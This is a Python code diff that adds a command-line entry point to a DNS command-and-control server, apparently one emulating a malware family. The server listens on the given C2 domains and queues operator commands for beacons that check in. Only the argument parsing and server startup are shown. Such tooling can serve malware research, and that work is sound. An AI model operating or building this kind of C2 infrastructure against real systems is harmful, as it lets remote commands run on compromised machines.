@@ -1,4 +1,5 @@
 import logging
+import argparse
 import traceback
 import sys
 from socketserver import BaseRequestHandler, ThreadingUDPServer
@@ -86,7 +87,56 @@ class UdpRequestHandler(BaseRequestHandler):
             pass
 
 def main():
-    pass
+    parser = argparse.ArgumentParser(description="Start a DNS C2 Server for a malware family")
+    parser.add_argument("-p", "--port", default=53, type=int, help="The port to listen on (default 53).")
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        help="Set logging level to debug",
+        action="store_const",
+        dest="loglevel",
+        const=logging.DEBUG,
+        default=logging.INFO,
+    )
+
+    parser.add_argument(
+        "-d",
+        "--domain",
+        help="C2 Domains for the C2 Server to listen to. Parameter can be passed multiple times.",
+        action="append",
+        dest="domains",
+        required=True,
+    )
+
+    parser.add_argument(
+        "-c",
+        "--command",
+        help="Command(s) to execute upon beacon check-in. Parameter can be passed multiple times.",
+        action="append",
+        dest="commands",
+        required=True,
+    )
+
+    args = parser.parse_args()
+    logging.basicConfig(format="%(asctime)s : %(message)s", datefmt="%H:%M:%S", level=args.loglevel)
+
+    domains = args.domains
+    commands = args.commands
+    port = args.port
+    c2_server = alien(domains)
+    
+    for command in commands:
+        c2_server.schedule_task_for_new_beacons(command)
+
+    logging.info("Starting nameserver...")
+    server = ThreadingUDPServer(("0.0.0.0", port), DnsServer(c2_server, domains))
+
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        server.shutdown()
 
 if __name__ == "__main__":
     main()
